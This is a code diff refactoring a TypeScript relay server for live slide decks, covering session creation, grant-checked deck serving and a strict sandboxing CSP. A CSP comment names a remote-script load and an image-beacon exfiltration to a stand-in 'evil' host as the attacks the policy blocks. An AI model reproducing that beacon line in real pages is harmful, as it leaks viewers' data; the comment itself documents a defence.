@@ -214,252 +214,256 @@ export function createRelay(opts: RelayOptions): RelayServer {
     void persist(s).finally(() => s.hub.destroy());
   };
 
-  // The HTTP handler, extracted as a closure (so it keeps access to sessions/cfg/cordoned) — the
-  // Bun.serve `fetch` below wraps it in a SERVER span. Returns a Response, or undefined for a
-  // successful WebSocket upgrade (Bun's hold-the-socket signal).
+  // POST /api/sessions — create a live session from an uploaded deck (ADR 0061). A closure over
+  // cfg/sessions/metrics/persist/dropSession; returns the session-info JSON, or a reject response
+  // (401/503/413/400/429) with the matching metric incremented.
+  const handleCreateSession = async (req: Request): Promise<Response> => {
+    const account = matchAccount(cfg.accountTokens, bearer(req));
+    if (!account) {
+      metrics.sessionRejects.inc({ reason: "unauthorized" });
+      return json({ error: "unauthorized" }, 401);
+    }
+    // Cordoned pods take no new sessions — a backstop; placement already skips us.
+    if (cordoned) {
+      metrics.sessionRejects.inc({ reason: "cordoned" });
+      return json({ error: "relay draining" }, 503);
+    }
+
+    const declared = Number(req.headers.get("content-length") ?? "0");
+    if (declared > cfg.maxDeckBytes) {
+      metrics.sessionRejects.inc({ reason: "too_large" });
+      return json({ error: "deck too large" }, 413);
+    }
+    const html = await req.text();
+    if (Buffer.byteLength(html, "utf8") > cfg.maxDeckBytes) {
+      metrics.sessionRejects.inc({ reason: "too_large" });
+      return json({ error: "deck too large" }, 413);
+    }
+    if (!html.trim()) {
+      metrics.sessionRejects.inc({ reason: "empty" });
+      return json({ error: "empty deck" }, 400);
+    }
+
+    const count = [...sessions.values()].filter((s) => s.account === account).length;
+    if (count >= cfg.maxSessionsPerAccount) {
+      metrics.sessionRejects.inc({ reason: "quota" });
+      return json({ error: "session quota reached" }, 429);
+    }
+
+    // Hosted live (ADR 0061): the control plane opts a session into audience
+    // write-scope enforcement (scope read from the deck's own embedded manifest)
+    // and names the object-storage key its Yjs snapshot persists to.
+    const enforce = req.headers.get("x-live-enforce") === "1";
+    const snapshotKey = req.headers.get("x-snapshot-key") || undefined;
+    // Plan limits the control plane passes per session (ADR 0061): the duration
+    // (so a free session's link dies on time, not at the relay's 6h default) and
+    // the audience cap. TTL is clamped to the relay max; absent → relay default.
+    const reqTtl = Number(req.headers.get("x-session-ttl-ms") ?? "");
+    const ttlMs = Number.isFinite(reqTtl) && reqTtl > 0 ? Math.min(reqTtl, cfg.sessionTtlMs) : cfg.sessionTtlMs;
+    const capHdr = Number(req.headers.get("x-audience-cap") ?? "");
+    const audienceCap = Number.isFinite(capHdr) && capHdr > 0 ? capHdr : undefined;
+    const watermark = req.headers.get("x-watermark") === "1";
+    // Stable session id across re-provision (ADR 0072): the control plane re-creates
+    // a recovered session under the SAME id on a new pod, so the audience URL
+    // (`/s/<id>?t=<grant>`) and its stateless grant stay valid — only the pod the
+    // multi-layer ForwardAuth route resolves to changes. Absent (CLI) → relay mints one.
+    const providedId = (req.headers.get("x-session-id") || "").trim() || undefined;
+
+    const session = createSession();
+    if (providedId) {
+      // A stale entry under this id (re-provision raced its predecessor's teardown)
+      // is dropped + snapshotted first so the fresh, re-seeded one wins.
+      const stale = sessions.get(providedId);
+      if (stale) dropSession(stale);
+      session.id = providedId;
+    }
+    const hub = new Hub({
+      keepaliveMs: cfg.keepaliveMs,
+      audience: enforce ? { scope: audienceScopeFromHtml(html), rate: cfg.audienceRate } : undefined,
+    });
+    // Re-seed from a prior snapshot if one exists (relay restart / reconnect).
+    if (cfg.storage && snapshotKey) {
+      try {
+        const prior = await cfg.storage.get(snapshotKey);
+        if (prior) {
+          hub.seed(prior);
+          metrics.snapshotSeed.inc({ result: "hit" });
+        } else {
+          metrics.snapshotSeed.inc({ result: "miss" });
+        }
+      } catch {
+        /* no prior snapshot / unreadable → start fresh */
+        metrics.snapshotSeed.inc({ result: "error" });
+      }
+    }
+    const rs: RelaySession = {
+      id: session.id,
+      account,
+      hub,
+      html,
+      session,
+      runnerToken: hex(),
+      createdAt: Date.now(),
+      ttlMs,
+      enforce,
+      audienceCap,
+      audienceCount: 0,
+      watermark,
+      snapshotKey,
+    };
+    rs.ttl = setTimeout(() => dropSession(rs), ttlMs);
+    (rs.ttl as { unref?: () => void }).unref?.();
+    if (cfg.storage && snapshotKey) {
+      rs.snap = setInterval(() => void persist(rs), cfg.snapshotMs);
+      (rs.snap as { unref?: () => void }).unref?.();
+    }
+    sessions.set(rs.id, rs);
+    metrics.sessionCreates.inc();
+
+    // Mint signed, expiring presenter/viewer grants (ADR 0061) — the links carry
+    // these, and the relay verifies them statelessly with the account token; no
+    // per-session token is stored client-side. (Raw tokens are still returned for
+    // CLI/runner back-compat.)
+    const exp = rs.createdAt + ttlMs;
+    const presenterGrant = mintGrant({ session: rs.id, role: "presenter", exp }, account);
+    const viewerGrant = mintGrant({ session: rs.id, role: "viewer", exp }, account);
+
+    const { http, ws } = originOf(req, opts);
+    return json({
+      id: rs.id,
+      presenterToken: session.presenterToken,
+      viewerToken: session.viewerToken,
+      runnerToken: rs.runnerToken,
+      presenterGrant,
+      viewerGrant,
+      expiresAt: exp,
+      urls: {
+        presenter: `${http}/s/${rs.id}?t=${presenterGrant}`,
+        viewer: `${http}/s/${rs.id}?t=${viewerGrant}`,
+        sync: `${ws}/sync/${rs.id}`,
+      },
+    });
+  };
+
+  // GET /s/:id — serve the deck to a grant-bearing presenter/viewer in an opaque sandbox
+  // (ADR 0014/0069). A closure over sessions; returns the sandboxed HTML, or a 403 on a
+  // missing/invalid/expired grant (runner tokens are WS-only and may not load the page).
+  const serveDeck = (req: Request, url: URL, id: string): Response => {
+    const s = sessions.get(id);
+    const token = url.searchParams.get("t");
+    const role = s ? resolveRole(s, token, Date.now()) : null;
+    if (!s || !role || role === "runner" || !token) {
+      metrics.grantDenials.inc();
+      return new Response("Invalid or expired link.", { status: 403 });
+    }
+    const { http, ws } = originOf(req, opts);
+    const wsUrl = `${ws}/sync/${s.id}?t=${token}`;
+    const viewer = `${http}/s/${s.id}?t=${s.session.viewerToken}`;
+    // Free-tier provenance badge on the public audience view (ADR 0061); paid
+    // (white-label) sessions omit it. Presenter view is never watermarked.
+    const html = s.watermark && role === "viewer" ? injectWatermark(s.html) : s.html;
+    const body = injectBootstrap(html, { ws: wsUrl, session: s.id, role, token, participant: "", viewer });
+    return new Response(body, {
+      headers: {
+        "content-type": "text/html; charset=utf-8",
+        // Opaque-origin isolation: no allow-same-origin → the deck can't reach
+        // the relay's cookies/API/DOM, and each load is a fresh opaque origin
+        // (deck-to-deck isolation). connect-src pins the live socket to us.
+        // `allow-popups` enables the presenter pop-out (P → window.open of
+        // /s/:id?t=<presenterToken>#presenter) — the popup is itself served
+        // sandboxed by the relay and syncs through the Hub, so isolation holds
+        // (ADR 0014). Without it window.open throws in the sandbox.
+        // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
+        // iframe/Permissions-Policy feature) — browsers reject it and log a
+        // console error. Fullscreen for this top-level doc is governed by the
+        // Fullscreen API / Permissions-Policy, not the sandbox directive.
+        //
+        // `default-src 'none'` + a single-file allowlist (ADR 0069): a deck
+        // inlines all assets (ADR 0001), so it needs zero external origins —
+        // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
+        // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
+        // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
+        // to our sync socket and `allow-popups` for the presenter pop-out.
+        "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
+        "x-content-type-options": "nosniff",
+        "referrer-policy": "no-referrer",
+      },
+    });
+  };
+
+  // HTTP dispatcher — a closure (keeps access to sessions/cfg/cordoned), wrapped in a SERVER span
+  // by the Bun.serve `fetch` below. Returns a Response, or undefined for a successful WebSocket
+  // upgrade (Bun's hold-the-socket signal). The two fat routes live in their own closures above;
+  // the small infra/control + connect routes stay inline.
   const handleFetch = async (req: Request, srv: Bun.Server<WSData>): Promise<Response | undefined> => {
-      const url = new URL(req.url);
-      const { pathname } = url;
+    const url = new URL(req.url);
+    const { pathname } = url;
 
-      if (pathname === "/healthz") return new Response("ok");
+    if (pathname === "/healthz") return new Response("ok");
 
-      // --- fleet stats: this pod's live load, for control-plane placement ----
-      // (ADR 0071 §2 / ticket 0017). Account-gated because the per-pod Ingress makes
-      // it publicly reachable; only the control plane (with the account token) reads it.
-      if (pathname === "/stats") {
-        if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
-        return json({ ok: true, sessions: sessions.size, cordoned, startedAt });
+    // --- fleet stats: this pod's live load, for control-plane placement (ADR 0071 §2). ---
+    // Account-gated — the per-pod Ingress makes it publicly reachable.
+    if (pathname === "/stats") {
+      if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
+      return json({ ok: true, sessions: sessions.size, cordoned, startedAt });
+    }
+
+    // --- Prometheus metrics: this pod's logical state (ADR 0073). Account-gated like /stats, so
+    // the bearer keeps it off the public surface; Alloy scrapes it on the pod network. ---
+    if (pathname === "/metrics") {
+      if (!matchAccount(cfg.accountTokens, bearer(req))) return new Response("unauthorized", { status: 401 });
+      return new Response(metrics.registry.render(), {
+        headers: { "content-type": "text/plain; version=0.0.4; charset=utf-8" },
+      });
+    }
+
+    // --- drain control: cordon/uncordon this pod (reconciler only, ADR 0071 §4). Cordoned →
+    // refuse NEW sessions; existing run to completion. `{ "cordoned": false }` lifts it. ---
+    if (pathname === "/cordon" && req.method === "POST") {
+      if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
+      const body = (await req.json().catch(() => ({}))) as { cordoned?: boolean };
+      cordoned = body.cordoned !== false;
+      return json({ ok: true, cordoned });
+    }
+
+    // --- control API: create / end a session (ADR 0061). ---
+    if (pathname === "/api/sessions" && req.method === "POST") return handleCreateSession(req);
+    const del = pathname.match(/^\/api\/sessions\/([^/]+)$/);
+    if (del && req.method === "DELETE") {
+      const account = matchAccount(cfg.accountTokens, bearer(req));
+      if (!account) return json({ error: "unauthorized" }, 401);
+      const s = sessions.get(del[1]!);
+      if (!s || s.account !== account) return json({ error: "not found" }, 404);
+      dropSession(s);
+      return new Response(null, { status: 204 });
+    }
+
+    // --- WebSocket sync: audience/presenter connect (ADR 0061). ---
+    const sync = pathname.match(/^\/sync\/([^/]+)$/);
+    if (sync) {
+      const s = sessions.get(sync[1]!);
+      const relRole = s ? resolveRole(s, url.searchParams.get("t"), Date.now()) : null;
+      if (!s || !relRole) {
+        metrics.grantDenials.inc();
+        return new Response("forbidden", { status: 403 });
       }
-
-      // --- Prometheus metrics: this pod's logical state (ADR 0073 / ticket 0023). ---
-      // Account-gated like /stats — the round-robin + per-pod ingresses route all paths, so
-      // the bearer keeps it off the public surface; Alloy scrapes it on the pod network with
-      // the account token. NOT routed by the stable host (ForwardAuth denies non-session paths).
-      if (pathname === "/metrics") {
-        if (!matchAccount(cfg.accountTokens, bearer(req))) return new Response("unauthorized", { status: 401 });
-        return new Response(metrics.registry.render(), {
-          headers: { "content-type": "text/plain; version=0.0.4; charset=utf-8" },
-        });
+      // viewer → audience (write-scope enforced when the session opted in);
+      // presenter + runner are trusted writers.
+      const role: PeerRole = relRole === "viewer" ? "audience" : "presenter";
+      // Enforce the plan's audience cap (ADR 0061) — presenter/runner never count.
+      if (role === "audience" && s.audienceCap !== undefined && s.audienceCount >= s.audienceCap) {
+        metrics.audienceCapRejects.inc();
+        return new Response("audience full", { status: 503 });
       }
+      const data: WSData = { sessionId: s.id, peer: null, role };
+      return srv.upgrade(req, { data }) ? undefined : new Response("upgrade failed", { status: 400 });
+    }
 
-      // --- drain control: cordon/uncordon this pod (reconciler only) ---------
-      // (ADR 0071 §4 / ticket 0019). Cordoned → refuse NEW sessions; existing ones
-      // run to completion. `{ "cordoned": false }` lifts it (e.g. a recreated pod).
-      if (pathname === "/cordon" && req.method === "POST") {
-        if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
-        const body = (await req.json().catch(() => ({}))) as { cordoned?: boolean };
-        cordoned = body.cordoned !== false;
-        return json({ ok: true, cordoned });
-      }
+    // --- serve the deck in an opaque sandbox (ADR 0014/0069). ---
+    const serve = pathname.match(/^\/s\/([^/]+)$/);
+    if (serve) return serveDeck(req, url, serve[1]!);
 
-      // --- control API: create a session by uploading a deck ---------------
-      if (pathname === "/api/sessions" && req.method === "POST") {
-        const account = matchAccount(cfg.accountTokens, bearer(req));
-        if (!account) {
-          metrics.sessionRejects.inc({ reason: "unauthorized" });
-          return json({ error: "unauthorized" }, 401);
-        }
-        // Cordoned pods take no new sessions — a backstop; placement already skips us.
-        if (cordoned) {
-          metrics.sessionRejects.inc({ reason: "cordoned" });
-          return json({ error: "relay draining" }, 503);
-        }
-
-        const declared = Number(req.headers.get("content-length") ?? "0");
-        if (declared > cfg.maxDeckBytes) {
-          metrics.sessionRejects.inc({ reason: "too_large" });
-          return json({ error: "deck too large" }, 413);
-        }
-        const html = await req.text();
-        if (Buffer.byteLength(html, "utf8") > cfg.maxDeckBytes) {
-          metrics.sessionRejects.inc({ reason: "too_large" });
-          return json({ error: "deck too large" }, 413);
-        }
-        if (!html.trim()) {
-          metrics.sessionRejects.inc({ reason: "empty" });
-          return json({ error: "empty deck" }, 400);
-        }
-
-        const count = [...sessions.values()].filter((s) => s.account === account).length;
-        if (count >= cfg.maxSessionsPerAccount) {
-          metrics.sessionRejects.inc({ reason: "quota" });
-          return json({ error: "session quota reached" }, 429);
-        }
-
-        // Hosted live (ADR 0061): the control plane opts a session into audience
-        // write-scope enforcement (scope read from the deck's own embedded manifest)
-        // and names the object-storage key its Yjs snapshot persists to.
-        const enforce = req.headers.get("x-live-enforce") === "1";
-        const snapshotKey = req.headers.get("x-snapshot-key") || undefined;
-        // Plan limits the control plane passes per session (ADR 0061): the duration
-        // (so a free session's link dies on time, not at the relay's 6h default) and
-        // the audience cap. TTL is clamped to the relay max; absent → relay default.
-        const reqTtl = Number(req.headers.get("x-session-ttl-ms") ?? "");
-        const ttlMs = Number.isFinite(reqTtl) && reqTtl > 0 ? Math.min(reqTtl, cfg.sessionTtlMs) : cfg.sessionTtlMs;
-        const capHdr = Number(req.headers.get("x-audience-cap") ?? "");
-        const audienceCap = Number.isFinite(capHdr) && capHdr > 0 ? capHdr : undefined;
-        const watermark = req.headers.get("x-watermark") === "1";
-        // Stable session id across re-provision (ADR 0072): the control plane re-creates
-        // a recovered session under the SAME id on a new pod, so the audience URL
-        // (`/s/<id>?t=<grant>`) and its stateless grant stay valid — only the pod the
-        // multi-layer ForwardAuth route resolves to changes. Absent (CLI) → relay mints one.
-        const providedId = (req.headers.get("x-session-id") || "").trim() || undefined;
-
-        const session = createSession();
-        if (providedId) {
-          // A stale entry under this id (re-provision raced its predecessor's teardown)
-          // is dropped + snapshotted first so the fresh, re-seeded one wins.
-          const stale = sessions.get(providedId);
-          if (stale) dropSession(stale);
-          session.id = providedId;
-        }
-        const hub = new Hub({
-          keepaliveMs: cfg.keepaliveMs,
-          audience: enforce ? { scope: audienceScopeFromHtml(html), rate: cfg.audienceRate } : undefined,
-        });
-        // Re-seed from a prior snapshot if one exists (relay restart / reconnect).
-        if (cfg.storage && snapshotKey) {
-          try {
-            const prior = await cfg.storage.get(snapshotKey);
-            if (prior) {
-              hub.seed(prior);
-              metrics.snapshotSeed.inc({ result: "hit" });
-            } else {
-              metrics.snapshotSeed.inc({ result: "miss" });
-            }
-          } catch {
-            /* no prior snapshot / unreadable → start fresh */
-            metrics.snapshotSeed.inc({ result: "error" });
-          }
-        }
-        const rs: RelaySession = {
-          id: session.id,
-          account,
-          hub,
-          html,
-          session,
-          runnerToken: hex(),
-          createdAt: Date.now(),
-          ttlMs,
-          enforce,
-          audienceCap,
-          audienceCount: 0,
-          watermark,
-          snapshotKey,
-        };
-        rs.ttl = setTimeout(() => dropSession(rs), ttlMs);
-        (rs.ttl as { unref?: () => void }).unref?.();
-        if (cfg.storage && snapshotKey) {
-          rs.snap = setInterval(() => void persist(rs), cfg.snapshotMs);
-          (rs.snap as { unref?: () => void }).unref?.();
-        }
-        sessions.set(rs.id, rs);
-        metrics.sessionCreates.inc();
-
-        // Mint signed, expiring presenter/viewer grants (ADR 0061) — the links carry
-        // these, and the relay verifies them statelessly with the account token; no
-        // per-session token is stored client-side. (Raw tokens are still returned for
-        // CLI/runner back-compat.)
-        const exp = rs.createdAt + ttlMs;
-        const presenterGrant = mintGrant({ session: rs.id, role: "presenter", exp }, account);
-        const viewerGrant = mintGrant({ session: rs.id, role: "viewer", exp }, account);
-
-        const { http, ws } = originOf(req, opts);
-        return json({
-          id: rs.id,
-          presenterToken: session.presenterToken,
-          viewerToken: session.viewerToken,
-          runnerToken: rs.runnerToken,
-          presenterGrant,
-          viewerGrant,
-          expiresAt: exp,
-          urls: {
-            presenter: `${http}/s/${rs.id}?t=${presenterGrant}`,
-            viewer: `${http}/s/${rs.id}?t=${viewerGrant}`,
-            sync: `${ws}/sync/${rs.id}`,
-          },
-        });
-      }
-
-      // --- control API: end a session (owner only) -------------------------
-      const del = pathname.match(/^\/api\/sessions\/([^/]+)$/);
-      if (del && req.method === "DELETE") {
-        const account = matchAccount(cfg.accountTokens, bearer(req));
-        if (!account) return json({ error: "unauthorized" }, 401);
-        const s = sessions.get(del[1]!);
-        if (!s || s.account !== account) return json({ error: "not found" }, 404);
-        dropSession(s);
-        return new Response(null, { status: 204 });
-      }
-
-      // --- WebSocket sync --------------------------------------------------
-      const sync = pathname.match(/^\/sync\/([^/]+)$/);
-      if (sync) {
-        const s = sessions.get(sync[1]!);
-        const relRole = s ? resolveRole(s, url.searchParams.get("t"), Date.now()) : null;
-        if (!s || !relRole) {
-          metrics.grantDenials.inc();
-          return new Response("forbidden", { status: 403 });
-        }
-        // viewer → audience (write-scope enforced when the session opted in);
-        // presenter + runner are trusted writers.
-        const role: PeerRole = relRole === "viewer" ? "audience" : "presenter";
-        // Enforce the plan's audience cap (ADR 0061) — presenter/runner never count.
-        if (role === "audience" && s.audienceCap !== undefined && s.audienceCount >= s.audienceCap) {
-          metrics.audienceCapRejects.inc();
-          return new Response("audience full", { status: 503 });
-        }
-        const data: WSData = { sessionId: s.id, peer: null, role };
-        return srv.upgrade(req, { data }) ? undefined : new Response("upgrade failed", { status: 400 });
-      }
-
-      // --- serve the deck in an opaque sandbox -----------------------------
-      const serve = pathname.match(/^\/s\/([^/]+)$/);
-      if (serve) {
-        const s = sessions.get(serve[1]!);
-        const token = url.searchParams.get("t");
-        const role = s ? resolveRole(s, token, Date.now()) : null;
-        // runner token must not load the page (it's WS-only)
-        if (!s || !role || role === "runner" || !token) {
-          metrics.grantDenials.inc();
-          return new Response("Invalid or expired link.", { status: 403 });
-        }
-        const { http, ws } = originOf(req, opts);
-        const wsUrl = `${ws}/sync/${s.id}?t=${token}`;
-        const viewer = `${http}/s/${s.id}?t=${s.session.viewerToken}`;
-        // Free-tier provenance badge on the public audience view (ADR 0061); paid
-        // (white-label) sessions omit it. Presenter view is never watermarked.
-        const html = s.watermark && role === "viewer" ? injectWatermark(s.html) : s.html;
-        const body = injectBootstrap(html, { ws: wsUrl, session: s.id, role, token, participant: "", viewer });
-        return new Response(body, {
-          headers: {
-            "content-type": "text/html; charset=utf-8",
-            // Opaque-origin isolation: no allow-same-origin → the deck can't reach
-            // the relay's cookies/API/DOM, and each load is a fresh opaque origin
-            // (deck-to-deck isolation). connect-src pins the live socket to us.
-            // `allow-popups` enables the presenter pop-out (P → window.open of
-            // /s/:id?t=<presenterToken>#presenter) — the popup is itself served
-            // sandboxed by the relay and syncs through the Hub, so isolation holds
-            // (ADR 0014). Without it window.open throws in the sandbox.
-            // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
-            // iframe/Permissions-Policy feature) — browsers reject it and log a
-            // console error. Fullscreen for this top-level doc is governed by the
-            // Fullscreen API / Permissions-Policy, not the sandbox directive.
-            //
-            // `default-src 'none'` + a single-file allowlist (ADR 0069): a deck
-            // inlines all assets (ADR 0001), so it needs zero external origins —
-            // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
-            // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
-            // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
-            // to our sync socket and `allow-popups` for the presenter pop-out.
-            "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
-            "x-content-type-options": "nosniff",
-            "referrer-policy": "no-referrer",
-          },
-        });
-      }
-
-      return new Response("not found", { status: 404 });
+    return new Response("not found", { status: 404 });
   };
 
   const server = Bun.serve<WSData>({
